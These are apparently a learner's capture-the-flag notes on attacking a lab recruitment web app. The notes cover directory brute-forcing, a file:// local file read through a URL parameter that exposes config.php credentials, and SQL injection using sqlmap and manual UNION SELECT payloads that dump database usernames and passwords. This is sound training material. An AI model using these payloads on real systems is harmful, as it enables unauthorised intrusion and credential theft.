- first visited 
```
http://10.82.175.157/
```
![[Pasted image 20260718173549.png]]


- `view-source:http://10.82.175.157/`
![[Pasted image 20260718174304.png]]

- network tab on reload
![[Pasted image 20260718174341.png]]

- ran gobuster with command:
```bash
gobuster dir -u "http://10.82.175.157/" -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![[Pasted image 20260718174937.png]]
- results:
![[Pasted image 20260718175230.png]]

- `http://10.82.175.157/assets/`
![[Pasted image 20260718175337.png]]

- `http://10.82.175.157/javascript/`
![[Pasted image 20260718175406.png]]
- big find
	- come back here when logged in?

- `http://10.82.175.157/mail/mail.log`
![[Pasted image 20260718175545.png]]
- look 
	- it says that the HR login creds with username: `hr` are stored in config.php
	- lets not rush tho, there is this page too:

- `http://10.82.175.157/phpmyadmin/`
![[Pasted image 20260718175708.png]]

- `http://10.82.175.157/sitemap.xml`
![[Pasted image 20260718180137.png]]

- `http://10.82.175.157/file.php`
![[Pasted image 20260718180410.png]]
- odd. when i add `?cv=a` this happens?:
![[Pasted image 20260718180439.png]]
- i tried adding `core.js` but this didnt work
![[Pasted image 20260718180701.png]]
- come back to this

- pretty sure the answer is trying to request config.php
![[Pasted image 20260718182023.png]]
- but `http://10.82.175.157/file.php?cv=http://10.82.175.157/config.php` still doesnt work

- i try a bunch more stuff but i hit a brick wall so i looked up a write up on how to do this 
	- reason it didnt work is because i need to type the URL like this: 
```
http://10.82.175.157/file.php?cv=file:///var/www/html/config.php
```
- because its a local file i need to use `file://var/www/html` 
	- learn this for next time i guess
![[Pasted image 20260718214055.png]]
- username: `hr`
- password: `hrpassword123`
![[Pasted image 20260718214304.png]]

- tried XSS but it gave me this instead
![[Pasted image 20260718214609.png]]
- so im guessing i need to use SQL injection
- after trying to find 20 columns via
```sql
' 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
```
- this garbage i hit another brick wall and look on the guide
	- it says to use sqlmap, so i will do exactly that
- capture a request to the Search button
![[Pasted image 20260718215836.png|613]]
- create a text file of the request
![[Pasted image 20260718215901.png]]
- feed it as input to sql map with parameters `-r` and `-dbs`
	- `-dbs` enumerates databases
	- `-r` reads the text file as input
- output:
![[Pasted image 20260718220336.png]]
- recruit_db is the database name

- do the same for tables:
```
sqlmap -r req.txt -D recruit_db --tables  
```
- `-D` flag is the database name
- output:
![[Pasted image 20260718220544.png]]
- `users` is the table name

- now dump the users table:
```
sqlmap -r req.txt -D recruit_db -T users -dump
```
- `-T` is the table name
- output:
![[Pasted image 20260718221536.png]]

- the user is `admin`
- the password is `admin@001admin`
![[Pasted image 20260718221732.png]]

**MANUAL APPROACH**
- use this query
```sql
' ORDER BY 1 -- -
```
- to enumerate columns
	- increment by 1 each time until error
![[Pasted image 20260719200815.png]]
- there are only 4 columns

```sql
' UNION SELECT 1,2,3,4 -- -
```
![[Pasted image 20260719200921.png]]
- `UNION` queries are possible

```sql
' UNION SELECT 1,2,3,database() -- -
```
![[Pasted image 20260719211717.png]]
- database name is `recruit_db`

```sql
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'recruit_db' -- -
```
![[Pasted image 20260719211954.png]]
- table names are `candidates,users`

```sql
' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' -- -
```
![[Pasted image 20260719212247.png]]
- columns `username` and `password` stand out

```sql
' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users -- -
```
![[Pasted image 20260719212441.png]]
- the admin username and password have been revealed
